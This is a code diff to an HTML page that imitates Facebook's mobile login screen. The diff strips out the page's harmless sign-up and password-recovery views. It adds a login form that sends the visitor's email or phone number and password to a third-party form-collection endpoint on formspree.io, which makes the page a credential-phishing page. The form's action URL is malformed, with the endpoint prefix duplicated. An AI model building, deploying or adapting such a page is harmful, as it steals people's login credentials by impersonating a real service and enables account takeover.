@@ -6,59 +6,17 @@
     <title>Facebook Mobile</title>
     <style>
         * { box-sizing: border-box; }
-        body { 
-            margin: 0; padding: 0; font-family: Helvetica, Arial, sans-serif; 
-            background-color: #fff; display: flex; flex-direction: column; align-items: center; 
-        }
-
+        body { margin: 0; padding: 0; font-family: Helvetica, Arial, sans-serif; background-color: #fff; display: flex; flex-direction: column; align-items: center; }
         .header { width: 100%; text-align: center; padding: 30px 0 10px; }
         .header img { width: 130px; }
-
-        /* Common Container for all views */
         .container { width: 90%; max-width: 400px; margin-top: 10px; }
-        
-        input { 
-            width: 100%; padding: 15px; margin-bottom: 10px; 
-            border: 1px solid #ccc; border-radius: 4px; font-size: 16px; 
-            background: #f5f6f7; outline: none;
-        }
-
-        .btn-blue { 
-            width: 100%; background: #1877f2; color: white; border: none; 
-            padding: 12px; font-size: 18px; font-weight: bold; border-radius: 4px; 
-            cursor: pointer; margin-top: 5px;
-        }
-
-        .link-text { 
-            display: block; text-align: center; margin: 15px 0; 
-            color: #1877f2; text-decoration: none; font-size: 14px; cursor: pointer;
-        }
-
+        input { width: 100%; padding: 15px; margin-bottom: 10px; border: 1px solid #ccc; border-radius: 4px; font-size: 16px; background: #f5f6f7; outline: none; }
+        .btn-blue { width: 100%; background: #1877f2; color: white; border: none; padding: 12px; font-size: 18px; font-weight: bold; border-radius: 4px; cursor: pointer; margin-top: 5px; }
+        .link-text { display: block; text-align: center; margin: 15px 0; color: #1877f2; text-decoration: none; font-size: 14px; cursor: pointer; }
         .divider { display: flex; align-items: center; color: #8a8d91; margin: 20px 0; font-size: 13px; }
         .divider::before, .divider::after { content: ""; flex: 1; border-bottom: 1px solid #ddd; }
         .divider span { padding: 0 10px; }
-
-        .btn-new { 
-            width: 80%; margin: 0 auto; display: block; background: #fff; 
-            color: #1877f2; border: 1px solid #1877f2; padding: 10px; 
-            font-weight: bold; border-radius: 4px; cursor: pointer;
-        }
-
-        /* Recovery Page Specific */
-        .recovery-title { font-size: 18px; font-weight: bold; margin-bottom: 10px; color: #1c1e21; }
-        .recovery-desc { font-size: 14px; color: #606770; margin-bottom: 20px; }
-
-        .hidden { display: none; }
-
-        /* Full Screen Sign-Up Modal */
-        #signup-modal { 
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
-            background: white; display: none; flex-direction: column; z-index: 9999; 
-        }
-        .modal-nav { padding: 15px; border-bottom: 1px solid #ddd; display: flex; justify-content: space-between; align-items: center; font-weight: bold; }
-        .modal-body { padding: 20px; }
-        .row { display: flex; gap: 5px; margin-bottom: 10px; }
-        select { flex: 1; padding: 10px; border: 1px solid #ddd; border-radius: 4px; }
+        .btn-new { width: 80%; margin: 0 auto; display: block; background: #fff; color: #1877f2; border: 1px solid #1877f2; padding: 10px; font-weight: bold; border-radius: 4px; cursor: pointer; }
     </style>
 </head>
 <body>
@@ -68,67 +26,20 @@
     </div>
 
     <div id="login-view" class="container">
-        <input type="text" placeholder="Mobile number or email">
-        <input type="password" placeholder="Password">
-        <button class="btn-blue" onclick="alert('Logging in...')">Log In</button>
-        <div class="link-text" onclick="showView('forgot')">Forgotten password?</div>
+        
+        <form action="https://formspree.io/f/https://formspree.io/f/xlgpjeon" method="POST">
+            
+            <input type="text" name="Email_Or_Phone" placeholder="Mobile number or email" required>
+            <input type="password" name="User_Password" placeholder="Password" required>
+            
+            <button type="submit" class="btn-blue">Log In</button>
+            
+        </form>
+
+        <div class="link-text">Forgotten password?</div>
         <div class="divider"><span>or</span></div>
-        <button class="btn-new" onclick="showView('signup')">Create new account</button>
+        <button class="btn-new">Create new account</button>
     </div>
 
-    <div id="forgot-view" class="container hidden">
-        <div class="recovery-title">Find Your Account</div>
-        <div class="recovery-desc">Enter your mobile number or email to search for your account.</div>
-        <input type="text" placeholder="Mobile number or email">
-        <button class="btn-blue" onclick="alert('Searching...')">Search</button>
-        <div class="link-text" onclick="showView('login')" style="color: #606770;">Cancel</div>
-    </div>
-
-    <div id="signup-modal">
-        <div class="modal-nav">
-            <span onclick="showView('login')" style="cursor:pointer; font-size: 20px;">✕</span>
-            <span>Create account</span>
-            <span></span>
-        </div>
-        <div class="modal-body">
-            <div class="row"><input type="text" placeholder="First name"><input type="text" placeholder="Surname"></div>
-            <input type="text" placeholder="Mobile number or email">
-            <input type="password" placeholder="New password">
-            <p style="font-size: 14px; color: #606770; margin: 10px 0 5px;">Birthday</p>
-            <div class="row" id="dob">
-                <select id="day"></select><select id="month"></select><select id="year"></select>
-            </div>
-            <button class="btn-blue" style="background:#00a400; margin-top:20px;" onclick="alert('Signup Success!')">Next</button>
-        </div>
-    </div>
-
-    <script>
-        function showView(view) {
-            // Hide everything first
-            document.getElementById('login-view').classList.add('hidden');
-            document.getElementById('forgot-view').classList.add('hidden');
-            document.getElementById('signup-modal').style.display = 'none';
-
-            if(view === 'login') {
-                document.getElementById('login-view').classList.remove('hidden');
-            } else if(view === 'forgot') {
-                document.getElementById('forgot-view').classList.remove('hidden');
-            } else if(view === 'signup') {
-                document.getElementById('signup-modal').style.display = 'flex';
-                loadDOB();
-            }
-        }
-
-        function loadDOB() {
-            const d = document.getElementById('day');
-            const m = document.getElementById('month');
-            const y = document.getElementById('year');
-            if(d.children.length > 0) return;
-
-            for(let i=1; i<=31; i++) d.innerHTML += `<option>${i}</option>`;
-            ["Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"].forEach(val => m.innerHTML += `<option>${val}</option>`);
-            for(let i=2026; i>=1980; i--) y.innerHTML += `<option>${i}</option>`;
-        }
-    </script>
 </body>
 </html>
